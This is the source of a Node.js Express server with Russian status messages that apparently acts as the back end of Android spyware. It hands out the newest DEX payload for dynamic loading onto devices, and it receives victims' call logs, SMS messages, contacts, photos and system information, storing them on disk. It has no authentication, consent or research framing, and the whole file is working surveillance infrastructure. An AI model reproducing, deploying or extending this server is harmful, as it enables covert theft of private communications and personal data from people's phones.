const express = require('express'); const multer = require("multer");
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;
app.use(express.json({ limit: '500mb' }));
app.use(express.urlencoded({ limit: '500mb' }));

const dexStorage = './dex_modules';
if (!fs.existsSync(dexStorage)) fs.mkdirSync(dexStorage);

app.get('/get-latest-dex', (req, res) => {
  console.log("/get-latest-dex")
  fs.readdir(dexStorage, (err, files) => {
    if (err || files.length === 0) return res.status(404).send('DEX не найден');
    const latestDex = files.sort().reverse()[0];
    res.sendFile(path.resolve(dexStorage, latestDex));
  });
});

app.post('/upload-calls', (req, res) => {
  console.log("/upload-calls:")
  const callLog = req.body;
  if (!callLog || !Array.isArray(callLog)) return res.status(400).send('Неверный формат данных')
  const logFile = './call_logs.json';
  fs.appendFile(logFile, JSON.stringify(callLog, null, 2) + ',\n', err => {
    if (err) return res.status(500).send('Ошибка при сохранении данных');
    res.json({ message: 'Журнал звонков сохранен' });
  });
});

app.post('/upload-sms', (req, res) => {
  console.log("/upload-sms")
  const callLog = req.body;
  const logFile = './sms.json';
  fs.appendFile(logFile, JSON.stringify(callLog, null, 2) + ',\n', err => {
    if (err) return res.status(500).send('Ошибка при сохранении данных');
    res.json({ message: 'SMS сохранены' });
  });
});

app.post('/upload-contacts', (req, res) => {
  console.log("/upload-contacts")
  const callLog = req.body;
  const logFile = './contacts.json';
  fs.appendFile(logFile, JSON.stringify(callLog, null, 2) + ',\n', err => {
    if (err) return res.status(500).send('Ошибка при сохранении данных');
    res.json({ message: 'Контакты сохранены' });
  });
});

const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const uploadPath = path.join(__dirname, "uploads");
    if (!fs.existsSync(uploadPath)) {
      fs.mkdirSync(uploadPath, { recursive: true });
    }
    cb(null, uploadPath);
  },
  filename: (req, file, cb) => {
    cb(null, Date.now() + "-" + file.originalname);
  }
});

const upload = multer({ storage });

app.post("/upload-photos", upload.array("photos", 5), (req, res) => {
  if (!req.files || req.files.length === 0) {
    return res.status(400).json({ message: "Файлы не загружены" });
  }

  res.json({
    message: "Фотографии успешно загружены",
    files: req.files.map(file => ({
      filename: file.filename,
      path: file.path
    }))
  });
});

app.post('/upload-system-info', (req, res) => {
  const systemInfo = req.body;
  console.log("/upload-system-info", Date.now().toLocaleString())

  const logEntry = {
    timestamp: new Date().toISOString(),
    data: systemInfo
  };

  fs.appendFileSync(
    path.join(__dirname, 'system_logs.json'),
    JSON.stringify(logEntry) + '\n'
  );

  res.status(200).json({
    status: 'success',
    receivedData: Object.keys(systemInfo)
  });
});

app.listen(PORT, () => {
  console.log(`Сервер запущен на http://localhost:${PORT}`);
});
